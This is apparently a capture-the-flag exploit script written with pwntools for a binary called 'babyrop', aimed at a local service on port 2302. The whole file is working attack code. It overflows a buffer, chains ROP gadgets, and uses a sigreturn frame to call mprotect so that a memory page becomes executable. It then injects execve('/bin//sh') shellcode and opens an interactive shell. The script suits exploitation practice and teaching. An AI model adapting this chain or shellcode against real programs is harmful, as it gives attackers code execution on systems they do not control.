from pwn import *
import time

DEBUGGING = False
LOCAL = False

context.terminal = ["tmux", "splitw", "-h"]
context.arch = "amd64"

if DEBUGGING:
    p = gdb.debug("./babyrop", gdbscript='''
''')
else:
    if LOCAL:
        p = process("./babyrop")
    else:
        p = remote('127.0.0.1', 2302)

pop_rbp = 0x00000000004010ed  # : pop rbp; ret;
pop_rdi = 0x0000000000401313  # : pop rdi; ret;
pop_rdx = 0x0000000000401152  # : pop rdx; ret;
pop_rsi = 0x0000000000401311  # : pop rsi; pop r15; ret;

syscall = 0x401124
read_bin = 0x401106
write_bin = 0x40112A
rop_pivot = 0x404100
rop_pivot_ptr = 0x404028
rop_pivot_page = 0x404000

shellcode = b'\x90'*40 + \
    b'\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05'

# prepare sigret frame
sigretFrame = SigreturnFrame()
sigretFrame.rax = 10  # mprotect for stack pivot
sigretFrame.rdi = rop_pivot_page  # address
sigretFrame.rsi = 80  # length
sigretFrame.rdx = 0x7  # flags
sigretFrame.rsp = rop_pivot_ptr  # ptr
sigretFrame.rip = syscall  # syscall ret

# craft the payload
payload = cyclic_find('eaac') * b'A'

# ret to read the shellcode
# read into rop_pivot
payload += p64(pop_rdi)
payload += p64(rop_pivot)

# read shellcode bytes
payload += p64(pop_rsi)
payload += p64(len(shellcode))
payload += p64(0x0)

# do read
payload += p64(read_bin)

# set from rop_pivot
payload += p64(pop_rdi)
payload += p64(rop_pivot)

# set count again
payload += p64(pop_rsi)
payload += p64(15)
payload += p64(0x0)

# dummy write to set RAX
payload += p64(write_bin)

# jump to sigret and then to shellcode
payload += p64(syscall)
payload += bytes(sigretFrame)

print("Payload length", len(payload))

p.sendline(payload)

# time.sleep(4)

p.sendline(shellcode)
p.interactive()
